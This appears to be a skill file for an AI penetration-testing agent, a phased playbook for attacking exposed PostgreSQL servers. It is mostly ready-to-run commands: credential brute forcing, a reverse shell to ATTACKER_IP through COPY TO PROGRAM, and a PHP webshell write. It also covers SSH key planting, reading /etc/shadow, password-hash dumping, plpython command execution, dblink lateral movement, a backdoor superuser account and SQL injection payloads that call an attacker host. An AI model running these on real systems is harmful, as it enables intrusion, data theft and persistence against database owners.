---
name: postgresql-attack
description: "PostgreSQL penetration testing and exploitation. Use when the target exposes port 5432, PostgreSQL allows remote connections, or you need to extract data from the database or achieve command execution. Covers unauthorized access, database enumeration and dumping, user credential extraction (pg_authid hashes), SQL injection variants, file reading (pg_read_file/COPY), command execution (COPY TO PROGRAM), privilege escalation (SUPERUSER), Large Object abuse, and extension abuse (file_fdw/plpython)"
zh-signals: "PostgreSQL 渗透测试与利用，覆盖未授权访问、数据提取与命令执行。信号:PostgreSQL,数据库攻击,5432,命令执行,pg_read_file"
when-to-use: "Use when a target exposes PostgreSQL on 5432, allows remote connections, and you need to enumerate, extract data, or achieve command execution."
metadata:
  tags: "postgresql,postgres,5432,pg_read_file,copy-to-program,pg_authid,large-object,file_fdw,plpython,dblink,superuser"
  category: "exploit"
---

# PostgreSQL Penetration Testing and Exploitation

PostgreSQL listens on port 5432 by default. Its powerful SQL engine, rich set of system functions, and extension mechanism mean that once connection access is obtained, everything from file read/write to operating system command execution takes only a few SQL statements.

## Further Reading (Must Read)
- Complete exploitation commands and payloads -> Read [references/attack-techniques.md](references/attack-techniques.md)

---

## Phase 1: Service Discovery

### 1.1 Port Scanning and Version Identification

```bash
# Nmap version probe
nmap -sV -p 5432 TARGET

# PostgreSQL information gathering script
nmap -p 5432 --script pgsql-brute TARGET
```

### 1.2 Manual Connection Test

```bash
# Test connectivity (no password)
psql -h TARGET -U postgres -c "SELECT version();"

# Test connectivity (with password)
PGPASSWORD=postgres psql -h TARGET -U postgres -c "SELECT version();"
```

**Key Decision**:
- Version information is returned -> connected, proceed to Phase 3
- `no pg_hba.conf entry` is returned -> the client IP is not on the allowlist, bypass is required
- `password authentication failed` is returned -> a password is required, proceed to Phase 2
- The connection times out -> the port is blocked by a firewall

---

## Phase 2: Authentication Detection

### 2.1 pg_hba.conf Authentication Modes

```
# Common authentication methods (these shape the attack path)
trust    — no password required, anyone can connect (most dangerous)
md5      — MD5 hash authentication (can be brute forced)
scram    — SCRAM-SHA-256 authentication (fairly secure)
peer     — local Unix socket only, the username must match the system user
```

### 2.2 Default Credential Attempts

```bash
# Common default user and password combinations
PGPASSWORD=postgres psql -h TARGET -U postgres -c "SELECT 1;"
PGPASSWORD=admin psql -h TARGET -U admin -c "SELECT 1;"
PGPASSWORD=password psql -h TARGET -U postgres -c "SELECT 1;"
PGPASSWORD=123456 psql -h TARGET -U postgres -c "SELECT 1;"
psql -h TARGET -U postgres -c "SELECT 1;"  # trust authentication needs no password
```

### 2.3 Brute Force

```bash
# Hydra
hydra -L users.txt -P passwords.txt postgres://TARGET

# Nmap
nmap -p 5432 --script pgsql-brute TARGET

# Medusa
medusa -h TARGET -U users.txt -P passwords.txt -M postgres

# Metasploit
msf> use auxiliary/scanner/postgres/postgres_login
msf> set RHOSTS TARGET
msf> run
```

---

## Phase 3: Attack Decision Tree

```
Connected to PostgreSQL?
├─ Query the current privileges
│   SELECT current_user, current_database();
│   SELECT rolsuper, rolcreaterole, rolcreatedb FROM pg_roles WHERE rolname = current_user;
│
├─ SUPERUSER privileges
│   ├─ COPY TO PROGRAM available -> RCE (Phase 4.1)
│   ├─ pg_read_file available -> arbitrary file read (Phase 4.2)
│   ├─ COPY FROM/TO available -> file read/write (Phase 4.3)
│   ├─ Large Object interface -> binary file read/write (Phase 4.4)
│   ├─ CREATE LANGUAGE -> plpython/plperlu RCE (Phase 4.5)
│   └─ pg_authid readable -> credential extraction (Phase 5.2)
│
├─ Regular user privileges
│   ├─ pg_read_file available (group membership by default on PG >= 14) -> file read (Phase 4.2)
│   ├─ dblink extension loaded -> internal lateral movement / privilege escalation (Phase 4.6)
│   ├─ member of pg_execute_server_program -> COPY TO PROGRAM RCE
│   ├─ information_schema readable -> database enumeration (Phase 5.1)
│   └─ Attempt privilege escalation -> ALTER ROLE / GRANT (Phase 6)
│
└─ SQL injection scenario
    ├─ Stacked queries available -> COPY TO PROGRAM RCE
    ├─ UNION injection -> data extraction
    ├─ Time-based blind injection -> pg_sleep() probing
    └─ Error-based injection -> CAST type conversion errors
```

### Preliminary Information Gathering

```bash
# Current user and privileges
psql -h TARGET -U postgres -c "SELECT current_user, current_database();"
psql -h TARGET -U postgres -c "SELECT rolsuper, rolcreaterole, rolcreatedb FROM pg_roles WHERE rolname = current_user;"

# Installed extensions
psql -h TARGET -U postgres -c "SELECT * FROM pg_extension;"

# Available languages
psql -h TARGET -U postgres -c "SELECT * FROM pg_language;"

# PostgreSQL version
psql -h TARGET -U postgres -c "SELECT version();"

# Data directory
psql -h TARGET -U postgres -c "SHOW data_directory;"

# Configuration file paths
psql -h TARGET -U postgres -c "SHOW config_file;"
psql -h TARGET -U postgres -c "SHOW hba_file;"
```

---

## Phase 4: RCE and File Operation Quick Reference

### 4.1 COPY TO PROGRAM Command Execution (Requires SUPERUSER)

```bash
# Execute a system command directly
psql -h TARGET -U postgres -c "COPY (SELECT '') TO PROGRAM 'id';"

# Reverse shell
psql -h TARGET -U postgres -c "COPY (SELECT '') TO PROGRAM 'bash -c \"bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1\"';"

# Write a webshell
psql -h TARGET -U postgres -c "COPY (SELECT '<?php system(\$_GET[\"cmd\"]); ?>') TO PROGRAM 'tee /var/www/html/shell.php';"
```

### 4.2 File Reading

```bash
# pg_read_file (SUPERUSER or member of the pg_read_server_files group)
psql -h TARGET -U postgres -c "SELECT pg_read_file('/etc/passwd');"
psql -h TARGET -U postgres -c "SELECT pg_read_file('/var/lib/postgresql/data/pg_hba.conf');"

# pg_read_binary_file (read a binary file)
psql -h TARGET -U postgres -c "SELECT encode(pg_read_binary_file('/etc/shadow'), 'hex');"

# COPY FROM reads a file into a temporary table
psql -h TARGET -U postgres -c "CREATE TEMP TABLE tmp(content text); COPY tmp FROM '/etc/passwd'; SELECT * FROM tmp;"
```

### 4.3 File Writing

```bash
# COPY TO writes a file
psql -h TARGET -U postgres -c "COPY (SELECT 'malicious content') TO '/tmp/output.txt';"

# Write an SSH public key
psql -h TARGET -U postgres -c "COPY (SELECT 'ssh-rsa AAAA... attacker@host') TO '/var/lib/postgresql/.ssh/authorized_keys';"
```

### 4.4 Large Object File Read/Write

```bash
# Import a file as a Large Object
psql -h TARGET -U postgres -c "SELECT lo_import('/etc/passwd');"
# Returns an OID (for example 12345)

# Read the Large Object content
psql -h TARGET -U postgres -c "SELECT convert_from(lo_get(12345), 'UTF8');"

# Export the Large Object to a file
psql -h TARGET -U postgres -c "SELECT lo_export(12345, '/tmp/exfil.txt');"

# Cleanup
psql -h TARGET -U postgres -c "SELECT lo_unlink(12345);"
```

### 4.5 plpython/plperlu RCE

```bash
# Create an untrusted PL language (requires SUPERUSER)
psql -h TARGET -U postgres -c "CREATE LANGUAGE plpython3u;"

# Create a function that executes commands
psql -h TARGET -U postgres -c "
CREATE OR REPLACE FUNCTION cmd_exec(cmd text) RETURNS text AS \$\$
import subprocess
return subprocess.check_output(cmd, shell=True).decode()
\$\$ LANGUAGE plpython3u;"

# Execute a command
psql -h TARGET -U postgres -c "SELECT cmd_exec('id');"
psql -h TARGET -U postgres -c "SELECT cmd_exec('cat /etc/passwd');"

# plperlu alternative
psql -h TARGET -U postgres -c "CREATE LANGUAGE plperlu;"
psql -h TARGET -U postgres -c "
CREATE OR REPLACE FUNCTION cmd_exec(cmd text) RETURNS text AS \$\$
  my \$output = qx(\$_[0]);
  return \$output;
\$\$ LANGUAGE plperlu;"
```

### 4.6 dblink Lateral Movement

```bash
# Load the dblink extension
psql -h TARGET -U postgres -c "CREATE EXTENSION IF NOT EXISTS dblink;"

# Connect to another PostgreSQL in the internal network
psql -h TARGET -U postgres -c "SELECT dblink_connect('conn1', 'host=INTERNAL_TARGET port=5432 user=postgres password=postgres dbname=postgres');"

# Run a remote query through dblink
psql -h TARGET -U postgres -c "SELECT * FROM dblink('conn1', 'SELECT usename, passwd FROM pg_shadow') AS t(usename text, passwd text);"

# Run a remote command through dblink (the remote side requires SUPERUSER)
psql -h TARGET -U postgres -c "SELECT dblink_exec('conn1', 'COPY (SELECT '''') TO PROGRAM ''id''');"
```

-> More methods and complete payloads -> Read [references/attack-techniques.md](references/attack-techniques.md)

---

## Phase 5: Data Extraction Quick Reference

### 5.1 Database Enumeration

```bash
# List all databases
psql -h TARGET -U postgres -c "\l"

# List all tables
psql -h TARGET -U postgres -d DATABASE_NAME -c "\dt *.*"

# List all schemas
psql -h TARGET -U postgres -d DATABASE_NAME -c "\dn"

# List all roles
psql -h TARGET -U postgres -c "\du"

# Search for sensitive table names
psql -h TARGET -U postgres -d DATABASE_NAME -c "SELECT tablename FROM pg_tables WHERE tablename LIKE '%password%' OR tablename LIKE '%secret%' OR tablename LIKE '%user%';"

# Search for sensitive column names
psql -h TARGET -U postgres -d DATABASE_NAME -c "SELECT table_name, column_name FROM information_schema.columns WHERE column_name LIKE '%password%' OR column_name LIKE '%secret%' OR column_name LIKE '%token%';"
```

### 5.2 Credential Extraction

```bash
# pg_authid (requires SUPERUSER, contains password hashes)
psql -h TARGET -U postgres -c "SELECT rolname, rolpassword FROM pg_authid;"

# pg_shadow (legacy compatibility view)
psql -h TARGET -U postgres -c "SELECT usename, passwd FROM pg_shadow;"

# Example output formats:
#   md5 hash: md5<32 hex digits> (md5 + MD5(password + username))
#   SCRAM hash: SCRAM-SHA-256$<iterations>:<salt>$<stored_key>:<server_key>
```

### 5.3 Data Export

```bash
# pg_dump exports an entire database
pg_dump -h TARGET -U postgres DATABASE_NAME > dump.sql

# pg_dump exports only specific tables
pg_dump -h TARGET -U postgres -t table_name DATABASE_NAME > table_dump.sql

# pg_dumpall exports all databases (including role information)
pg_dumpall -h TARGET -U postgres > full_dump.sql

# COPY exports query results to CSV
psql -h TARGET -U postgres -d DATABASE_NAME -c "COPY (SELECT * FROM users) TO STDOUT WITH CSV HEADER;"
```

---

## Phase 6: Privilege Escalation

```bash
# Check the current privileges
psql -h TARGET -U postgres -c "SELECT rolname, rolsuper, rolcreaterole, rolcreatedb, rolcanlogin FROM pg_roles;"

# Check the members of privileged groups
psql -h TARGET -U postgres -c "SELECT r.rolname, m.rolname AS member_of FROM pg_auth_members am JOIN pg_roles r ON am.roleid = r.oid JOIN pg_roles m ON am.member = m.oid;"
```

### Privilege Escalation Paths

```
Current privileges?
├─ CREATEROLE privileges available
│   ├─ GRANT pg_execute_server_program TO current_user; -> COPY TO PROGRAM RCE
│   ├─ GRANT pg_read_server_files TO current_user; -> arbitrary file read
│   └─ GRANT pg_write_server_files TO current_user; -> arbitrary file write
│
├─ pg_hba.conf can be modified (through file write)
│   └─ Change it to trust authentication -> log back in as SUPERUSER
│
├─ Already SUPERUSER
│   ├─ ALTER ROLE attacker WITH SUPERUSER; -> escalate other users
│   └─ CREATE ROLE backdoor WITH SUPERUSER LOGIN PASSWORD 'pass'; -> create a backdoor account
│
└─ dblink available
    └─ Connect locally as postgres through dblink (may bypass authentication)
```

---

## SQL Injection Quick Reference

```bash
# Version detection
' UNION SELECT NULL, version()--

# Current user
' UNION SELECT NULL, current_user--

# Database list
' UNION SELECT NULL, datname FROM pg_database--

# Table list
' UNION SELECT NULL, tablename FROM pg_tables WHERE schemaname='public'--

# Time-based blind injection
'; SELECT pg_sleep(5)--

# Stacked queries + RCE (highest threat)
'; COPY (SELECT '') TO PROGRAM 'curl http://ATTACKER_IP/rce'--

# Error-based injection (data extraction)
' AND 1=CAST((SELECT version()) AS int)--

# Boolean-based blind injection
' AND (SELECT SUBSTRING(version(),1,1))='P'--
```

---

## Tool Quick Reference

| Tool | Purpose |
|------|------|
| psql | Official PostgreSQL client |
| pgcli | Enhanced client with auto-completion |
| pg_dump / pg_dumpall | Database export tools |
| hydra / medusa | PostgreSQL password brute forcing |
| nmap pgsql-brute | Built-in Nmap brute force script |
| sqlmap | Automated SQL injection detection and exploitation |
| Metasploit | Collection of PostgreSQL modules (login/enumeration/RCE) |

---

## Notes

- `COPY TO PROGRAM` was introduced in PostgreSQL 9.3+ and is unavailable on older versions
- `pg_read_file` by default only reads files under `data_directory`, while SUPERUSER can read any path
- The `u` in `plpython3u` / `plperlu` means untrusted, and only SUPERUSER can create them
- Large Object operations must run inside a transaction, so note that psql autocommits by default
- PostgreSQL logs every executed SQL statement, so pay attention to the `log_statement` configuration level
- Changes to `pg_hba.conf` take effect only after `SELECT pg_reload_conf();` or a restart
- Managed PostgreSQL services (RDS/Cloud SQL) usually disable COPY TO PROGRAM and filesystem access
